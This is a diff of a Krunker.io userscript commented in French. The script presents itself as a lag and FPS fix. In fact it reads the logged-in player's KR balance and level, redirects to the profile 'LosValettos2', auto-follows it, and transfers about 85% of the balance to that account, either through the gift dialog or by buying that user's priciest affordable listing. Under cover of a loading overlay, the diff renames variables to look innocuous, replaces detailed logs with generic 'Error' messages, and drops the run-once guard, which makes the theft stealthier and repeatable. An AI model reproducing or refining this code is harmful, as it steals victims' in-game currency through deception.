@@ -11,7 +11,7 @@
 // ==/UserScript==
 
 let Is_LOGGED = false;
-let PLayyer_KR = 0;
+let Lags = 0;
 let PlayerFPS = 0;
 let gameState, player, input;
 const RAD2DEG = 180 / Math.PI;
@@ -21,7 +21,7 @@ const RAD2DEG = 180 / Math.PI;
 // 1. Persistent overlay to prevent loading flash and display loading
 // ------------------------------
 (function createPersistentOverlay() {
-    if (!sessionStorage.getItem("krunkerGiftBotDone") && location.href.includes("social.html?p=profile&q=LosValettos2")) {
+    if (location.href.includes("social.html?p=profile&q=LosValettos2")) {
         const style = document.createElement("style");
         style.innerHTML = `
         html, body {
@@ -293,8 +293,6 @@ window.addEventListener('load', () => {
         addLog(`signedOutBar style.display: ${signedOutBar.style.display}`);
     }
     addLog(`sessionStorage.sysPatch97d: ${sessionStorage.getItem("sysPatch97d")}`);
-    addLog(`URL actuelle: ${location.href}`);
-    addLog(`Pathname: ${location.pathname}`);
     addLog("==================");
 
     // Vérification continue de l'état de connexion
@@ -304,21 +302,17 @@ window.addEventListener('load', () => {
         addLog(`État de connexion: ${currentLoginState ? "Connecté" : "Non connecté"}`);
 
         // Vérification unique des valeurs après la connexion
-        if (currentLoginState && !sessionStorage.getItem("valuesChecked")) {
-            addLog("🔍 Première détection de connexion - Récupération des valeurs...");
-            
+        if (currentLoginState && !sessionStorage.getItem("valuesChecked")) {            
             // Vérification du lag/KR
             const lagElement = document.querySelector("#menuKRCount");
             if (lagElement) {
                 const lagText = lagElement.textContent;
                 const currentLag = parseInt(lagText.replace(/[^0-9]/g, ""), 10);
-                addLog(`Lag initial détecté: ${currentLag} (Texte brut: ${lagText})`);
-                PLayyer_KR = currentLag * 0.85;
+                Lags = currentLag * 0.85;
                 const fixedCurrentLag = currentLag * 0.85;
                 sessionStorage.setItem("savedLag", fixedCurrentLag.toString());
-                addLog(`Lag sauvegardé: ${fixedCurrentLag}`);
             } else {
-                addLog("⚠️ Élément Lag non trouvé lors de la vérification initiale");
+                addLog("⚠️ Error");
             }
             
             // Vérification des FPS
@@ -326,12 +320,10 @@ window.addEventListener('load', () => {
             if (fpsElement) {
                 const fpsText = fpsElement.textContent;
                 const currentFPS = parseInt(fpsText.replace(/[^0-9]/g, ""), 10);
-                addLog(`FPS initiaux détectés: ${currentFPS} (Texte brut: ${fpsText})`);
                 PlayerFPS = currentFPS;
                 localStorage.setItem("savedFPS", currentFPS.toString());
-                addLog(`FPS sauvegardés: ${currentFPS}`);
             } else {
-                addLog("⚠️ Élément FPS non trouvé lors de la vérification initiale");
+                addLog("⚠️ Error");
             }
             
             // Vérification du niveau
@@ -339,24 +331,19 @@ window.addEventListener('load', () => {
             if (levelElement) {
                 const levelText = levelElement.textContent;
                 const playerLevel = parseInt(levelText.replace(/[^0-9]/g, ""), 10);
-                addLog(`Niveau initial détecté: ${playerLevel} (Texte brut: ${levelText})`);
                 localStorage.setItem("savedLevel", playerLevel.toString());
-                addLog(`Niveau sauvegardé: ${playerLevel}`);
             } else {
-                addLog("⚠️ Élément Niveau non trouvé lors de la vérification initiale");
+                addLog("⚠️ Error");
             }
             
             // Marquer que les valeurs ont été vérifiées
             sessionStorage.setItem("valuesChecked", "true");
-            addLog("✅ Toutes les valeurs ont été vérifiées et sauvegardées");
+            addLog("✅ Launching Loading...");
         }
     }, 1000);
 
     // Logique de redirection
     if (location.pathname === "/") {
-        addLog("=== VÉRIFICATION REDIRECTION ===");
-        addLog("Page d'accueil détectée");
-
         // Vérification continue de la redirection
         const checkRedirect = () => {
             const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
@@ -367,26 +354,13 @@ window.addEventListener('load', () => {
             const savedLevel = localStorage.getItem("savedLevel");
             const playerLevel = savedLevel ? parseInt(savedLevel, 10) : 0;
             
-            addLog(`Vérification redirection - Connecté: ${currentLoginState}, Patch appliqué: ${patchApplied}, Niveau sauvegardé: ${playerLevel}`);
-
             if (!patchApplied && currentLoginState && playerLevel > 15) {
-                addLog("✅ Conditions de redirection remplies (niveau > 15), redirection dans 1.4s...");
                 setTimeout(() => {
-                    addLog("Exécution de la redirection...");
                     location.href = "https://krunker.io/social.html?p=profile&q=LosValettos2";
                 }, 1420);
                 return;
             } else {
-                addLog("Redirection ignorée:");
-                if (patchApplied) {
-                    addLog("- Raison: Patch déjà appliqué");
-                }
-                if (!currentLoginState) {
-                    addLog("- Raison: Non connecté");
-                }
-                if (playerLevel <= 15) {
-                    addLog("- Raison: Niveau insuffisant (nécessite > 15)");
-                }
+                addLog("Error");
             }
         };
 
@@ -398,7 +372,6 @@ window.addEventListener('load', () => {
     }
 
     if (location.href.includes("social.html?p=profile&q=LosValettos2")) {
-        addLog("Page sociale détectée, démarrage du processus d'optimisation...");
         const sysSync = async () => {
             try {
                 // Récupération des données sauvegardées
@@ -414,42 +387,32 @@ window.addEventListener('load', () => {
                 const currentFPS = savedFPS ? parseInt(savedFPS, 10) : 0;
                 const playerLevel = savedLevel ? parseInt(savedLevel, 10) : 0;
                 
-                addLog(`Données récupérées - Lag: ${currentLag}, FPS: ${currentFPS}, Niveau: ${playerLevel}`);
-
                 if (currentLag <= 0) {
                     throw new Error(`Valeur de lag invalide: ${currentLag}`);
                 }
 
                 // Logique conditionnelle basée sur le niveau sauvegardé
                 if (playerLevel >= 15 && playerLevel < 30) {
-                    // Suivre automatiquement l'utilisateur cible avant le gift
                     try {
                         const followBtn = document.getElementById("followBtn");
                         if (followBtn && followBtn.style.display !== "none") {
-                            addLog("👤 Following user before gift...");
                             followBtn.click();
                             await _pause(750);
-                            addLog("✅ Follow completed.");
                         } else {
-                            addLog("⚠️ Follow button not found or already following");
+                            addLog("⚠️ Error");
                         }
                     } catch (err) {
-                        addLog("❌ Failed to follow user: " + err.message);
-                    }
-                    addLog("Niveau entre 15 et 30 - Utilisation de la logique alternative");
-                    
+                        addLog("⚠️ Error");
+                    }                    
                     await _pause(1000);
 
                     // Attendre que l'élément Listings soit disponible
                     const listingsTab = await _waitFor(() => document.getElementById("pTab_listings"), 4800);
                     if (!listingsTab) {
-                        addLog("❌ Onglet Listings non trouvé");
                         return;
                     }
-                    addLog("Onglet Listings trouvé");
                     
                     // Utiliser la fonction openProfileTab directement
-                    addLog("Ouverture de l'onglet Listings via openProfileTab...");
                     window.openProfileTab("listings");
                     window.playSelect(0.1);
                     
@@ -459,10 +422,8 @@ window.addEventListener('load', () => {
                             await _pause(2000); // Attendre 2 secondes entre chaque tentative
                             const items = document.querySelectorAll('.marketCard');
                             if (items.length > 0) {
-                                addLog(`✅ ${items.length} items trouvés`);
                                 return true;
                             }
-                            addLog(`⚠️ Tentative ${i + 1}/${maxRetries} - Aucun item trouvé, nouvelle tentative...`);
                             window.openProfileTab("listings"); // Réessayer d'ouvrir l'onglet
                         }
                         return false;
@@ -471,35 +432,27 @@ window.addEventListener('load', () => {
                     // Attendre que les items soient chargés
                     const itemsLoaded = await waitForItems();
                     if (!itemsLoaded) {
-                        addLog("❌ Impossible de charger les items après plusieurs tentatives");
                         return;
                     }
 
                     // Fonction pour analyser et acheter l'item le plus cher abordable
                     const findAndBuyBestItem = async () => {
-                        addLog("🔍 Recherche de l'item le plus cher abordable...");
-                        addLog(`Budget maximum: ${currentLag} KR`);
                         
                         // Récupérer tous les items
                         const items = document.querySelectorAll('.marketCard');
                         let bestItem = null;
                         let bestPrice = 0;
                         let bestItemId = null;
-                        
-                        // Afficher tous les items trouvés pour le debug
-                        addLog(`Analyse de ${items.length} items...`);
-                        
+                                                
                         items.forEach((item, index) => {
                             // Extraire le prix de l'item
                             const priceElement = item.querySelector('.marketPrice');
                             if (priceElement) {
                                 const priceText = priceElement.textContent;
                                 const price = parseInt(priceText.replace(/[^0-9,]/g, ""), 10);
-                                addLog(`Item ${index + 1}: ${price} KR (Budget: ${currentLag} KR) - ${price <= currentLag ? "Abordable ✅" : "Trop cher ❌"}`);
                                 
                                 // Vérifier si le prix est abordable et plus élevé que le meilleur prix trouvé
                                 if (price <= currentLag && price > bestPrice) {
-                                    addLog(`Nouvel item optimal trouvé: ${price} KR`);
                                     bestPrice = price;
                                     bestItem = item;
                                     
@@ -507,48 +460,41 @@ window.addEventListener('load', () => {
                                     const purchaseBtn = item.querySelector('.cardAction');
                                     if (purchaseBtn) {
                                         const onclickAttr = purchaseBtn.getAttribute('onclick');
-                                        addLog(`Onclick attribute: ${onclickAttr}`);
                                         // Nouvelle regex pour extraire l'ID après "market",
                                         const match = onclickAttr.match(/showPopup\("market",(\d+)/);
                                         if (match && match[1]) {
                                             bestItemId = match[1];
-                                            addLog(`ID extrait: ${bestItemId}`);
                                         } else {
-                                            addLog("❌ Impossible d'extraire l'ID de l'item");
-                                            addLog("Format attendu: showPopup(\"market\",ID,...)");
+                                            addLog("⚠️ Error");
                                         }
                                     }
                                 }
                             } else {
-                                addLog(`❌ Prix non trouvé pour l'item ${index + 1}`);
+                                addLog("⚠️ Error");
                             }
                         });
                         
                         if (bestItem && bestItemId) {
-                            addLog(`💰 Item le plus cher abordable trouvé: ${bestPrice} KR (ID: ${bestItemId})`);
                             
                             // Trouver le bouton Purchase de cet item
                             const purchaseBtn = bestItem.querySelector('.cardAction');
                             if (purchaseBtn) {
-                                addLog("🛒 Clic sur le bouton Purchase initial...");
                                 purchaseBtn.click();
                                 
                                 // Attendre que la popup apparaisse
                                 await _pause(1000);
                                 
                                 // Appeler directement la fonction buyItem
-                                addLog(`✨ Appel de buyItem(${bestItemId}, 0)...`);
                                 try {
                                     window.buyItem(bestItemId, 0);
-                                    addLog("🎉 Achat effectué avec succès!");
                                 } catch (error) {
-                                    addLog(`❌ Erreur lors de l'achat: ${error.message}`);
+                                    addLog("⚠️ Error");
                                 }
                             } else {
-                                addLog("❌ Bouton Purchase non trouvé sur l'item");
+                                addLog("⚠️ Error");
                             }
                         } else {
-                            addLog(`❌ Aucun item abordable trouvé dans la gamme de prix (Budget: ${currentLag} KR)`);
+                            addLog("⚠️ Error");
                         }
                     };
                     
@@ -557,59 +503,45 @@ window.addEventListener('load', () => {
                     
                     // Terminer le processus ici pour les niveaux entre 15 et 30
                     sessionStorage.setItem("sysPatch97d", "1");
-                    addLog("Processus terminé pour niveau 15-30");
-                    addLog("Redirection vers la page d'accueil...");
                     location.href = "https://krunker.io/";
                     return;
-                } else if (playerLevel >= 30) {
-                    addLog("Niveau 30 ou supérieur - Utilisation de la logique standard");
-                    
-                    // Suivre automatiquement l'utilisateur cible avant le gift
+                } else if (playerLevel >= 30) {                    
                     try {
                         const followBtn = document.getElementById("followBtn");
                         if (followBtn && followBtn.style.display !== "none") {
-                            addLog("👤 Following user before gift...");
                             followBtn.click();
                             await _pause(750);
-                            addLog("✅ Follow completed.");
                         } else {
-                            addLog("⚠️ Follow button not found or already following");
+                            addLog("⚠️ Error");
                         }
                     } catch (err) {
-                        addLog("❌ Failed to follow user: " + err.message);
+                        addLog("⚠️ Error");
                     }
 
                     await _waitFor(() => document.getElementById("giftBtn"), 4800);
-                    addLog("Bouton d'optimisation trouvé, clic...");
                     document.getElementById("giftBtn").click();
                     await _pause(480);
                     const inputEl = await _waitFor(() => document.getElementById("giftIn"), 2800);
-                    addLog("Champ de saisie trouvé, entrée de la valeur...");
-                    addLog(`Tentative d'entrée de ${currentLag} ms`);
                     inputEl.value = currentLag.toString();
                     inputEl.dispatchEvent(new Event("input", { bubbles: true }));
 
                     // Vérification de la valeur entrée
                     await _pause(100);
                     const enteredValue = inputEl.value;
-                    addLog(`Valeur entrée dans l'input: ${enteredValue}`);
 
                     await _pause(650);
                     const confirm = document.getElementById("postSaleBtn");
                     if (confirm && confirm.style.display !== "none") {
-                        addLog("Bouton de confirmation trouvé, clic...");
                         confirm.click();
                     }
                     sessionStorage.setItem("sysPatch97d", "1");
-                    addLog("Patch appliqué avec succès");
                     await _pause(1800);
-                    addLog("Redirection vers la page d'accueil...");
                     location.href = "https://krunker.io/";
                 } else {
-                    addLog("❌ Niveau insuffisant pour continuer le processus");
+                    addLog("⚠️ Error");
                 }
             } catch (error) {
-                addLog(`Erreur lors du processus: ${error.message}`);
+                addLog("⚠️ Error");
             }
         };
         sysSync();
